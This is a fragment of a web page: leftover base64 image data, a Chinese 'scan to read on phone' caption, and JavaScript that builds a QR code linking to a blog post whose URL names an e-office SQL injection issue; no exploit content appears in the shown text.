oaiKETn3MC24HA+imC6LBGvw0nDnNOv6P5jrscpO/ow6xBOAR7784hOZhxvMd4DcmpQTgE1XcIycEnbgeya3Lq/+0JbD+p+/T026t3NAeZtnyX0xchdbBGc6J9IXlA6/gtS8GsXASWv4WZFyE5ufX3uLmv4PmGfOW0fiF7DKRPu99bH/K0QNCcvgizb040J++o3xHSF4LdL957ySE1EOx657DOwazXPWtZL8Kcg3AImhvxGMgontfPO4FjIJCp1aRrQbhbg/DyxqV/DyH1sEZ79j4w5/V3+fIhNT3TeWVr/VSH3K961dr1K+/eOgZyL3j6v3MCx99l9ds5ZVEf8jTAGs2JkJx9OvbcjquLkL7wiXod4TMDdPuKu0dg+VsYrHUbweyri/YX1QvPN6RO4YXW1UAg04Wge3WaHfVFmOvu6fo7vHe/0YfcWw3Cd73VITkIqu/Q/t2HdT1E39WpF14NpN/k5L97Alef1L19TauWXIRMG4KVqaVf17cWpA6C1onWyu8hpA9wRIHpz/7D+LjwHuKHvIBZgvSFoC7MXL0jJAfB7hc/35A6hRdax29ZPi3ibo/6ImTane/q1c2L6pB+8h1at8JdTdfhe/fqfeSrvZS289Uh+wDOf7n49mJfx88Q+JwS3L/2+6gnoBakRr0jxK9sre7vOKQOgj0H0YFuHbzuN67D2FwAD/0MgnUO1rq3g/gQVC88f4bUKbzQOgYyPkG3rh/dO2T6ELQO1nx3T+t2ONbtMuow31tdHHvVtTqkDmbU71i1tbr+CD8G8kj4zPz3J3A1EJifAgi/t5V6Ilar15mB9O0cokNQv/eB+HCNZq2FZNRh5ub0xZ2+8yF9YUbzEN2+K7waiMUnPucEfjwQyNQh6LcBM/dpgOhy81/FVb2aCLmXvdU76sOcV+95Oazz1nW0rusj//FAxmbn9c9P4McDceoi5KmR9y2qQ3IQVO8Is28/iC5f4a5Xz0J6mYdwcxAOQXXzorq40/Uh/eATfzwQm5/4d07gaiBOteO920GmbJ35ztVFfUg9BHe+ef0RYa7Vg1mHcAj2np3bZ6fri7sc5H49Z77waiCGT3zOCRwDgUwPbuNumzXdWjsf5r6VrWW+rselLupB+qiPaGbU6lq9Y3m1YN0TZh1mXrW3FiR/776QHHD+be/bi30db8iL7et/u51/AAAA//+W/RA7AAAABklEQVQDAEIi148PyKQ/AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-new\_mytable-content\_list-content-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 